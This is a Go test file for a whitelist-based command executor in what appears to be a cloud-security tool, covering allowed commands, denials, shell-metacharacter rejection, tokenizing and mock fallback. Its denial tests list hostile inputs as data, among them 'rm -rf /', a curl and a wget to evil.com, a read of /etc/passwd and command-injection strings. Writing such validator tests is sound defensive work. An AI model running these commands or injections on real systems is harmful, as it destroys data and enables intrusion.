package terminal

import (
	"context"
	"testing"
	"time"

	"go.uber.org/zap"
)

func newTestExecutor() *Executor {
	return NewExecutor(zap.NewNop())
}

func TestValidate_AllowedCommands(t *testing.T) {
	e := newTestExecutor()

	tests := []struct {
		name    string
		input   string
		wantBin string
	}{
		{"aws s3 ls", "aws s3 ls", "aws"},
		{"aws sts", "aws sts get-caller-identity", "aws"},
		{"aws ec2", "aws ec2 describe-instances --region us-east-1", "aws"},
		{"gcloud projects", "gcloud projects list", "gcloud"},
		{"az account", "az account list", "az"},
		{"kubectl get pods", "kubectl get pods", "kubectl"},
		{"kubectl get pods ns", "kubectl get pods -n aegis", "kubectl"},
		{"terraform state list", "terraform state list", "terraform"},
		{"terraform version", "terraform version", "terraform"},
		{"trivy image", "trivy image nginx:latest", "trivy"},
		{"aegis status", "aegis status", "aegis"},
		{"whoami", "whoami", "whoami"},
		{"date", "date", "date"},
		{"uptime", "uptime", "uptime"},
		{"hostname", "hostname", "hostname"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bin, _, err := e.Validate(tt.input)
			if err != nil {
				t.Fatalf("expected allowed, got error: %v", err)
			}
			if bin != tt.wantBin {
				t.Fatalf("binary = %q, want %q", bin, tt.wantBin)
			}
		})
	}
}

func TestValidate_DeniedCommands(t *testing.T) {
	e := newTestExecutor()

	tests := []struct {
		name  string
		input string
	}{
		{"rm", "rm -rf /"},
		{"curl", "curl https://evil.com"},
		{"bash", "bash -c whoami"},
		{"python", "python -c 'import os'"},
		{"aws s3 rm", "aws s3 rm s3://bucket"},
		{"aws iam create", "aws iam create-user --user-name hacker"},
		{"kubectl delete", "kubectl delete pods --all"},
		{"terraform destroy", "terraform destroy"},
		{"terraform apply", "terraform apply"},
		{"empty", ""},
		{"spaces only", "   "},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, err := e.Validate(tt.input)
			if err == nil {
				t.Fatal("expected denial, got nil error")
			}
		})
	}
}

func TestValidate_ShellMetachars(t *testing.T) {
	e := newTestExecutor()

	tests := []struct {
		name  string
		input string
	}{
		{"pipe", "aws s3 ls | grep bucket"},
		{"semicolon", "aws s3 ls; rm -rf /"},
		{"ampersand", "aws s3 ls & wget evil.com"},
		{"dollar", "aws s3 ls $HOME"},
		{"backtick", "aws s3 ls `whoami`"},
		{"redirect out", "aws s3 ls > /tmp/data"},
		{"redirect in", "aws s3 ls < /etc/passwd"},
		{"parens", "aws s3 ls $(whoami)"},
		{"hash", "aws s3 ls #comment"},
		{"newline", "aws s3 ls\nrm -rf /"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, err := e.Validate(tt.input)
			if err == nil {
				t.Fatal("expected shell metachar rejection, got nil error")
			}
		})
	}
}

func TestValidate_QuotedArgs(t *testing.T) {
	e := newTestExecutor()

	bin, args, err := e.Validate(`aws ec2 describe-instances --filters "Name=tag:Name,Values=aegis"`)
	if err != nil {
		t.Fatalf("expected allowed, got error: %v", err)
	}
	if bin != "aws" {
		t.Fatalf("binary = %q, want aws", bin)
	}
	// The quoted arg should be parsed as a single token.
	found := false
	for _, a := range args {
		if a == "Name=tag:Name,Values=aegis" {
			found = true
		}
	}
	if !found {
		t.Fatalf("quoted arg not parsed correctly, args = %v", args)
	}
}

func TestExecute_MockFallback(t *testing.T) {
	e := newTestExecutor()

	// Use a binary that definitely doesn't exist.
	result, err := e.Execute(context.Background(), "aegis", []string{"status"})
	if err != nil {
		t.Fatalf("mock execute should not error: %v", err)
	}
	if !result.IsMock {
		t.Fatal("expected IsMock=true for missing binary")
	}
	if result.ExitCode != 0 {
		t.Fatalf("mock exit code = %d, want 0", result.ExitCode)
	}
	if result.Stdout == "" {
		t.Fatal("expected non-empty mock output")
	}
}

func TestExecute_RealBinary(t *testing.T) {
	e := newTestExecutor()

	// date is available on all POSIX systems.
	result, err := e.Execute(context.Background(), "date", nil)
	if err != nil {
		t.Fatalf("execute date: %v", err)
	}
	if result.IsMock {
		t.Fatal("expected real execution for 'date'")
	}
	if result.Stdout == "" {
		t.Fatal("expected output from 'date'")
	}
	if result.ElapsedMs < 0 {
		t.Fatalf("elapsed_ms = %d, want >= 0", result.ElapsedMs)
	}
}

func TestExecute_Timeout(t *testing.T) {
	e := &Executor{
		whitelist: []AllowedCommand{{Binary: "sleep", Prefixes: []string{""}}},
		timeout:   100 * time.Millisecond,
		maxOutput: 512 * 1024,
		logger:    zap.NewNop(),
	}

	result, err := e.Execute(context.Background(), "sleep", []string{"10"})
	if err != nil {
		t.Fatalf("timeout should return result, not error: %v", err)
	}
	if result.ExitCode != -1 {
		t.Fatalf("exit code = %d, want -1 for timeout", result.ExitCode)
	}
}

func TestTokenize(t *testing.T) {
	tests := []struct {
		input string
		want  []string
	}{
		{"aws s3 ls", []string{"aws", "s3", "ls"}},
		{`aws ec2 describe-instances --filters "Name=tag:Env"`, []string{"aws", "ec2", "describe-instances", "--filters", "Name=tag:Env"}},
		{"  whoami  ", []string{"whoami"}},
		{"", nil},
	}

	for _, tt := range tests {
		got := tokenize(tt.input)
		if len(got) != len(tt.want) {
			t.Errorf("tokenize(%q) = %v, want %v", tt.input, got, tt.want)
			continue
		}
		for i := range got {
			if got[i] != tt.want[i] {
				t.Errorf("tokenize(%q)[%d] = %q, want %q", tt.input, i, got[i], tt.want[i])
			}
		}
	}
}

func TestMockKey(t *testing.T) {
	tests := []struct {
		binary string
		args   []string
		want   string
	}{
		{"aws", []string{"s3", "ls"}, "aws s3 ls"},
		{"aws", []string{"sts", "get-caller-identity"}, "aws sts get-caller-identity"},
		{"aws", []string{"ec2", "describe-instances", "--region", "us-east-1"}, "aws ec2 describe-instances"},
		{"whoami", nil, "whoami"},
		{"kubectl", []string{"get", "pods", "-n", "aegis"}, "kubectl get pods"},
		{"aws", []string{"--region", "us-east-1", "s3", "ls"}, "aws s3 ls"},
	}

	for _, tt := range tests {
		got := mockKey(tt.binary, tt.args)
		if got != tt.want {
			t.Errorf("mockKey(%q, %v) = %q, want %q", tt.binary, tt.args, got, tt.want)
		}
	}
}
